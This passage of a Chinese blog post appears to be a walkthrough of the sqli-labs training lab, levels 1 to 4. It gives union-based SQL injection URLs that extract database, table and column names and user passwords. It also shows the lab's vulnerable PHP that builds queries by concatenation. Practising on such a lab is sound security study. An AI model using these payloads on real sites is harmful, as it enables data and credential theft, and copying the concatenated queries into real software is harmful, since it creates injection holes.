+<h3 id="直接列出字段名"><a href="#直接列出字段名" class="headerlink" title="直接列出字段名"></a>直接列出字段名</h3><p>知道了表名和列名，一条语句可以直接列出结果:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-1'+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">id</span>,<span class="keyword">password</span>+<span class="keyword">from</span>+<span class="keyword">users</span><span class="comment">--+</span></div></pre></td></tr></table></figure></p>
+<p>这里的<code>users</code>还可以这样写<code>security.users</code><br>整个句子也还可以这样子写:<br><figure class="highlight r"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-<span class="number">1</span><span class="string">'+union+select+1,GROUP_CONCAT(id,username,password),3+from+users--+</span></div></pre></td></tr></table></figure></p>
+<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><h2 id="注入类型-1"><a href="#注入类型-1" class="headerlink" title="注入类型"></a>注入类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GET - 基于错误 - 单引号 - 数字型</div><div class="line">GET - Error based - Intiger based</div></pre></td></tr></table></figure>
+<h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><h3 id="尝试id值-1"><a href="#尝试id值-1" class="headerlink" title="尝试id值"></a>尝试id值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">index.php?id=1</div><div class="line">index.php?id=2</div><div class="line">页面返回正常，内容随着id的变化而变化</div></pre></td></tr></table></figure>
+<p><strong>猜测SQL语句为</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="keyword">input</span></div></pre></td></tr></table></figure></p>
+<h3 id="and尝试-1"><a href="#and尝试-1" class="headerlink" title="and尝试"></a>and尝试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">index.php?id=1 and 1=1 返回正常</div><div class="line">index.php?id=2 and 1=2 返回错误</div></pre></td></tr></table></figure>
+<p>这里说明我们猜测是正确的</p>
+<h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</div><div class="line">$result=mysql_query($sql);</div><div class="line">$row = mysql_fetch_array($result);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($row)</div><div class="line">	&#123;</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</div><div class="line">  	&#125;</div><div class="line">	<span class="keyword">else</span> </div><div class="line">	&#123;</div><div class="line">	print_r(mysql_error());</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		&#123; 	</div><div class="line">		<span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;</div><div class="line">		&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="Payload构造-1"><a href="#Payload构造-1" class="headerlink" title="Payload构造"></a>Payload构造</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-1 payload</div></pre></td></tr></table></figure>
+<h2 id="验证注入-1"><a href="#验证注入-1" class="headerlink" title="验证注入"></a>验证注入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-<span class="number">1</span> UNION SELECT <span class="number">1</span>,database(),version()--+</div></pre></td></tr></table></figure>
+<p><img src="http://image.3001.net/images/20171219/15136881242856.png" alt=""><br><strong>实战注入语句</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">index.php?id=-<span class="number">1</span> UNION SELECT <span class="number">1</span>,GROUP_CONCAT(schema_name),<span class="number">3</span> FROM information_schema.SCHEMATA --+  <span class="comment">//获取所有数据库名</span></div><div class="line"></div><div class="line">index.php?id=-<span class="number">1</span> UNION SELECT <span class="number">1</span>,GROUP_CONCAT(table_name),<span class="number">3</span> FROM information_schema.TABLES where TABLE_SCHEMA=<span class="string">'security'</span>--+  <span class="comment">//获取表名</span></div><div class="line"></div><div class="line">index.php?id=-<span class="number">1</span> UNION SELECT <span class="number">1</span>,GROUP_CONCAT(column_name),<span class="number">3</span> FROM information_schema.COLUMNS where TABLE_NAME=<span class="string">'users'</span>--+  <span class="comment">//获取列名</span></div><div class="line"></div><div class="line">index.php?id=-<span class="number">1</span> UNION SELECT <span class="number">1</span>,GROUP_CONCAT(username,password SEPARATOR <span class="string">'---'</span>),<span class="number">3</span> FROM users--+  <span class="comment">//获取所有的字段</span></div><div class="line"></div><div class="line">index.php?id=-<span class="number">1</span> UNION SELECT <span class="number">1</span>,username,password FROM users WHERE id=<span class="number">1</span> --+  <span class="comment">//获取id为1的单个的字段</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://image.3001.net/images/20171220/15137354242398.png" alt="">  </p>
+<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><h2 id="注入类型-2"><a href="#注入类型-2" class="headerlink" title="注入类型"></a>注入类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GET - 基于错误 - 单引号括号 - 字符型</div><div class="line">GET - Error based - Single quotes with twist - string</div></pre></td></tr></table></figure>
+<h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><h3 id="尝试id值-2"><a href="#尝试id值-2" class="headerlink" title="尝试id值"></a>尝试id值</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">index.php?id=<span class="number">1</span></div><div class="line">index.php?id=<span class="number">2</span></div><div class="line">页面返回正常，内容随着id的变化而变化</div></pre></td></tr></table></figure>
+<p><strong>猜测SQL语句为</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="keyword">input</span></div></pre></td></tr></table></figure></p>
+<h3 id="and尝试-2"><a href="#and尝试-2" class="headerlink" title="and尝试"></a>and尝试</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">index.php?id=<span class="number">1</span> and <span class="number">1</span>=<span class="number">1</span> 返回正常</div><div class="line">index.php?id=<span class="number">2</span> and <span class="number">1</span>=<span class="number">2</span> 返回正常</div></pre></td></tr></table></figure>
+<p>两次返回都正常，说明我们猜测的语句是有问题的。</p>
+<h3 id="单引号测试-1"><a href="#单引号测试-1" class="headerlink" title="单引号测试"></a>单引号测试</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">index.php?id=1'</div><div class="line">得到报错信息:</div><div class="line">MySQL server version for the right syntax to <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></div></pre></td></tr></table></figure>
+<h3 id="斜杠测试-1"><a href="#斜杠测试-1" class="headerlink" title="斜杠测试"></a>斜杠测试</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">index.php?id=1\</div><div class="line">得到报错信息:</div><div class="line"> MySQL server version for the right syntax to <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span>\<span class="string">') LIMIT 0,1'</span> <span class="keyword">at</span> line <span class="number">1</span></div></pre></td></tr></table></figure>
+<h3 id="推理-1"><a href="#推理-1" class="headerlink" title="推理"></a>推理</h3><p>报错最外面的<code>单引号</code>是程序用来标注错误的<code>单引号</code>，然后如下区分:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">near '   '1'') LIMIT 0,1   '</div><div class="line">near '   '1\') LIMIT 0,1   '</div></pre></td></tr></table></figure></p>
+<p>这里面外面输出的为:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">'1'') LIMIT 0,1</div><div class="line">'1\') LIMIT 0,1</div></pre></td></tr></table></figure></p>
+<p>说明源码中的<code>SQL</code>的语句里，<code>id</code>应该是有<code>单引号</code>和<code>括号</code>去标注的。<br><strong>再次猜测SQL语句为</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = (<span class="string">'input'</span>)</div></pre></td></tr></table></figure></p>
+<h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</div><div class="line">$result=mysql_query($sql);</div><div class="line">$row = mysql_fetch_array($result);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($row)</div><div class="line">	&#123;</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</div><div class="line">  	&#125;</div><div class="line">	<span class="keyword">else</span> </div><div class="line">	&#123;</div><div class="line">	print_r(mysql_error());  </div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="Payload构造-2"><a href="#Payload构造-2" class="headerlink" title="Payload构造"></a>Payload构造</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-1') payload <span class="comment">--+</span></div></pre></td></tr></table></figure>
+<h2 id="验证注入-2"><a href="#验证注入-2" class="headerlink" title="验证注入"></a>验证注入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-<span class="number">1</span><span class="string">') UNION SELECT 1,database(),version()--+</span></div></pre></td></tr></table></figure>
+<p><img src="http://image.3001.net/images/20171220/15137365975139.png" alt="">  </p>
+<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><h2 id="注入类型-3"><a href="#注入类型-3" class="headerlink" title="注入类型"></a>注入类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GET - 基于错误 - 双引号- 字符型</div><div class="line">GET - Error based - Double Quotes - String</div></pre></td></tr></table></figure>
+<h2 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h2><figure class="highlight r"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">index.php?id=<span class="number">1</span><span class="string">' 不报错</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">index.php?id=1\</span></div><div class="line"><span class="string">MySQL server version for the right syntax to use near '</span><span class="string">"1\") LIMIT 0,1' at line 1</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">index.php?id=1"</span></div><div class="line">MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">'"1"") LIMIT 0,1'</span> at line <span class="number">1</span></div></pre></td></tr></table></figure>
+<p><strong>猜测SQL语句为</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = (<span class="string">"input"</span>)</div></pre></td></tr></table></figure></p>
+<h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</div><div class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</div><div class="line">$result=mysql_query($sql);</div><div class="line">$row = mysql_fetch_array($result);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($row)</div><div class="line">	&#123;</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</div><div class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</div><div class="line">  	&#125;</div><div class="line">	<span class="keyword">else</span> </div><div class="line">	&#123;</div><div class="line">	print_r(mysql_error()); </div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="Payload构造-3"><a href="#Payload构造-3" class="headerlink" title="Payload构造"></a>Payload构造</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-<span class="number">1</span><span class="string">") payload --+</span></div></pre></td></tr></table></figure>
+<h2 id="验证注入-3"><a href="#验证注入-3" class="headerlink" title="验证注入"></a>验证注入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?id=-<span class="number">1</span><span class="string">") UNION SELECT 1,database(),version()--+</span></div></pre></td></tr></table></figure>
+      
+    </div>
+
+    <div>
+      
+        
+<div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="http://image.3001.net/images/20171103/15097023327128.png" alt="国光 wechat" style="width: 200px; max-width: 100%;"/>
+    <div>听说打赏我的人，都挖到了0day。</div>
+</div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/国光/" rel="tag"># 国光</a>
+          
+            <a href="/tags/SQL/" rel="tag"># SQL</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/nnuwifi.html" rel="next" title="一次对南师大的校园网认证系统的逻辑漏洞测试">
+                <i class="fa fa-chevron-left"></i> 一次对南师大的校园网认证系统的逻辑漏洞测试
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTU5Ny82MTY1"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://image.3001.net/images/20170929/15066688735308.jpg"
+               alt="国光" />
+          <p class="site-author-name" itemprop="name">国光</p>
+           
+              <p class="site-description motion-element" itemprop="description">宁静致远</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">30</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/5728586656" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.github.com/tezukanice/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/guo-guang-94/activities" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-tags"></i>
+                  
+                  知乎
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.ggsec.cn/" title="Demon" target="_blank">Demon</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://secretwiki.org/" title="Secretwiki" target="_blank">Secretwiki</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://bestwing.me/" title="SWing" target="_blank">SWing</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.inksec.cn" title="Szrzvdny|墨是人性" target="_blank">Szrzvdny|墨是人性</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-1"><span class="nav-number">1.</span> <span class="nav-text">Less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入类型"><span class="nav-number">1.1.</span> <span class="nav-text">注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程"><span class="nav-number">1.2.</span> <span class="nav-text">过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#尝试id值"><span class="nav-number">1.2.1.</span> <span class="nav-text">尝试id值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#and尝试"><span class="nav-number">1.2.2.</span> <span class="nav-text">and尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单引号测试"><span class="nav-number">1.2.3.</span> <span class="nav-text">单引号测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#斜杠测试"><span class="nav-number">1.2.4.</span> <span class="nav-text">斜杠测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#推理"><span class="nav-number">1.2.5.</span> <span class="nav-text">推理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#源码"><span class="nav-number">1.3.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload构造"><span class="nav-number">1.4.</span> <span class="nav-text">Payload构造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#引号闭合"><span class="nav-number">1.4.1.</span> <span class="nav-text">引号闭合</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#验证注入"><span class="nav-number">1.5.</span> <span class="nav-text">验证注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#闭合引号"><span class="nav-number">1.5.1.</span> <span class="nav-text">闭合引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注释"><span class="nav-number">1.5.2.</span> <span class="nav-text">注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实战拓展"><span class="nav-number">1.6.</span> <span class="nav-text">实战拓展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#猜测字段数目"><span class="nav-number">1.6.1.</span> <span class="nav-text">猜测字段数目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union-select-联合查询对应的字段"><span class="nav-number">1.6.2.</span> <span class="nav-text">union select 联合查询对应的字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用字段号收集信息"><span class="nav-number">1.6.3.</span> <span class="nav-text">利用字段号收集信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询表名"><span class="nav-number">1.6.4.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询列名"><span class="nav-number">1.6.5.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#直接列出字段名"><span class="nav-number">1.6.6.</span> <span class="nav-text">直接列出字段名</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-2"><span class="nav-number">2.</span> <span class="nav-text">Less-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入类型-1"><span class="nav-number">2.1.</span> <span class="nav-text">注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程-1"><span class="nav-number">2.2.</span> <span class="nav-text">过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#尝试id值-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">尝试id值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#and尝试-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">and尝试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#源码-1"><span class="nav-number">2.3.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload构造-1"><span class="nav-number">2.4.</span> <span class="nav-text">Payload构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#验证注入-1"><span class="nav-number">2.5.</span> <span class="nav-text">验证注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-3"><span class="nav-number">3.</span> <span class="nav-text">Less-3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入类型-2"><span class="nav-number">3.1.</span> <span class="nav-text">注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程-2"><span class="nav-number">3.2.</span> <span class="nav-text">过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#尝试id值-2"><span class="nav-number">3.2.1.</span> <span class="nav-text">尝试id值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#and尝试-2"><span class="nav-number">3.2.2.</span> <span class="nav-text">and尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单引号测试-1"><span class="nav-number">3.2.3.</span> <span class="nav-text">单引号测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#斜杠测试-1"><span class="nav-number">3.2.4.</span> <span class="nav-text">斜杠测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#推理-1"><span class="nav-number">3.2.5.</span> <span class="nav-text">推理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#源码-2"><span class="nav-number">3.3.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload构造-2"><span class="nav-number">3.4.</span> <span class="nav-text">Payload构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#验证注入-2"><span class="nav-number">3.5.</span> <span class="nav-text">验证注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-4"><span class="nav-number">4.</span> <span class="nav-text">Less-4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入类型-3"><span class="nav-number">4.1.</span> <span class="nav-text">注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过程-3"><span class="nav-number">4.2.</span> <span class="nav-text">过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#源码-3"><span class="nav-number">4.3.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload构造-3"><span class="nav-number">4.4.</span> <span class="nav-text">Payload构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#验证注入-3"><span class="nav-number">4.5.</span> <span class="nav-text">验证注入</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">国光</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user">访客数</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye">阅读数</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//oxhwlgrce.bkt.clouddn.com/jquery2.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.jsdelivr.net/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.jsdelivr.net/jquery.lazyload/1.9.3/jquery.lazyload.min.js"></script>
+
+  
